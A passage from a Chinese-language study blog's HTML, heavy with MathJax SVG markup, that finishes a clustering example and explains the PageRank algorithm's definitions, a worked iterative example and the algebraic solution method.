scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>。</p><p>得到新的类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="34.013ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 15033.9 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2050.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3106.2,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3606.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4614.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5059.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(6068,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g><g data-mml-node="mo" transform="translate(6568,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7012.7,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(9063.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(10118.9,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(10618.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(11627.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(12072.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(13080.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(13525.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(14533.9,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。</p><p>由于得到的新的类没有改变，聚类停止。得到聚类结果：$G_1^<em>=\{x_1,x_5\},G_2^</em>=\{x_2,x_3,x_4\}$。</p><h1 id="10-PageRank算法"><a href="#10-PageRank算法" class="headerlink" title="10. PageRank算法"></a>10. PageRank算法</h1><h2 id="10-1-PageRank算法的基本思想"><a href="#10-1-PageRank算法的基本思想" class="headerlink" title="10.1 PageRank算法的基本思想"></a>10.1 PageRank算法的基本思想</h2><p>PageRank算法的基本思想是在有向图上定义一个随机游走模型，即一阶马尔可夫链，描述随机游走者沿着有向图随机访问各个结点的行为。在一定条件下，极限情况访问每个结点的概率收敛到平稳分布，此时各个结点的平稳概率值就是其PageRank值，表示结点的重要度。</p><p>PageRank是递归定义的，PageRank的计算可以通过迭代算法进行。</p><img src="/posts/498ab7d9/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220616165722.png" class="" title="PageRank基本定义"><p>PageRank的基本定义是理想化的，在这种情况下，PageRank存在，而且可以通过不断迭代求得PageRank值。一般的有向图未必满足强连通且非周期性的条件，所以PageRank 的基本定义不适用。</p><p>假设有向图的转移矩阵为</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%8715.png" class="" title="转移矩阵"><p>这时M不是一个随机矩阵，因为随机矩阵要求每一列的元素之和是1，这里第3列的和是0，不是1。如果仍然计算在各个时刻的各个结点的概率分布，随着迭代次数增加，访问各个结点的概率均变为0。</p><p>PageRank一般定义的想法是在基本定义的基础上导入平滑项。</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%8714.png" class="" title="PageRank一般定义"><h2 id="10-2-迭代算法"><a href="#10-2-迭代算法" class="headerlink" title="10.2 迭代算法"></a>10.2 迭代算法</h2><p><img src="C:\Users\dell\Desktop\图片11.png" alt="图片11"></p><p>例子：</p><p>图中所示的有向图，取d = 0.8，求图的PageRank。</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%8712.png" class="" title="有向图"><p>解：</p><p>根据有向图可得转移矩阵（列表示出度，行表示入度）：</p><script type="math/tex; mode=display">M=\begin{pmatrix}0&\frac12&0&0\\\frac13&0&0&\frac12\\\frac13&0&1&\frac12\\\frac13&\frac12&0&0\end{pmatrix}</script><p>则</p><script type="math/tex; mode=display">dM=\frac45×M=\begin{pmatrix}0&\frac12&0&0\\\frac13&0&0&\frac12\\\frac13&0&1&\frac12\\\frac13&\frac12&0&0\end{pmatrix}=\begin{pmatrix}0&\frac25&0&0\\\frac4{15}&0&0&\frac25\\\frac4{15}&0&\frac45&\frac25\\\frac4{15}&\frac25&0&0\end{pmatrix}\\\frac {1-d}{n}1=\begin{pmatrix}\frac1{20}\\\frac1{20}\\\frac1{20}\\\frac1{20}\end{pmatrix}</script><p>所以迭代公式为</p><script type="math/tex; mode=display">R_{t+1}=\begin{pmatrix}0&\frac25&0&0\\\frac4{15}&0&0&\frac25\\\frac4{15}&0&\frac45&\frac25\\\frac4{15}&\frac25&0&0\end{pmatrix}R_t+\begin{pmatrix}\frac1{20}\\\frac1{20}\\\frac1{20}\\\frac1{20}\end{pmatrix}</script><p>令初始向量<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.705ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 1195.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mn" transform="translate(792,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container>为</p><script type="math/tex; mode=display">R_0=\begin{pmatrix}\frac14\\\frac14\\\frac14\\\frac14\end{pmatrix}</script><p>进行迭代</p><script type="math/tex; mode=display">R_{1}=\begin{pmatrix}0&\frac25&0&0\\\frac4{15}&0&0&\frac25\\\frac4{15}&0&\frac45&\frac25\\\frac4{15}&\frac25&0&0\end{pmatrix}\begin{pmatrix}\frac14\\\frac14\\\frac14\\\frac14\end{pmatrix}+\begin{pmatrix}\frac1{20}\\\frac1{20}\\\frac1{20}\\\frac1{20}\end{pmatrix}=\begin{pmatrix}\frac9{60}\\\frac{13}{60}\\\frac{25}{60}\\\frac{13}{60}\end{pmatrix}\\R_{2}=\begin{pmatrix}0&\frac25&0&0\\\frac4{15}&0&0&\frac25\\\frac4{15}&0&\frac45&\frac25\\\frac4{15}&\frac25&0&0\end{pmatrix}\begin{pmatrix}\frac9{60}\\\frac{13}{60}\\\frac{25}{60}\\\frac{13}{60}\end{pmatrix}+\begin{pmatrix}\frac1{20}\\\frac1{20}\\\frac1{20}\\\frac1{20}\end{pmatrix}=\begin{pmatrix}\frac{41}{300}\\\frac{53}{300}\\\frac{153}{300}\\\frac{53}{300}\end{pmatrix}\\\vdots</script><p>最后得到</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%8713.png" class="" title="迭代"><p>计算结果表明，结点C的PageRank值超过一半，其他结点也有相应的PageRank值。</p><h2 id="10-3-代数算法"><a href="#10-3-代数算法" class="headerlink" title="10.3 代数算法"></a>10.3 代数算法</h2><p>代数算法通过一般转移矩阵的逆矩阵计算求有向图的一般PageRank。</p><p>按照一般PageRank的定义式</p><script type="math/tex; mode=display">R=dMR+\frac{1-d}n1</script><p>于是</p><script type="math/tex; mode=display">(I-dM)R=\frac{1-d}m1</script><p>这里的I是单位矩阵。当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex" xmlns="http://www.w3.org/2000/svg" width="9.473ex" height="1.661ex" role="img" focusable="false" viewBox="0 -694 4187.1 734"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(1833.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(2631.3,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mn" transform="translate(3687.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>时，线性方程组的解存在且唯一，即</p><script type="math/tex; mode=display">R=(I-dM)^{-1}\frac{1-d}n1</script><p>这样，可以通过求逆矩阵<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.453ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 5062.1 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mo" transform="translate(1115.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 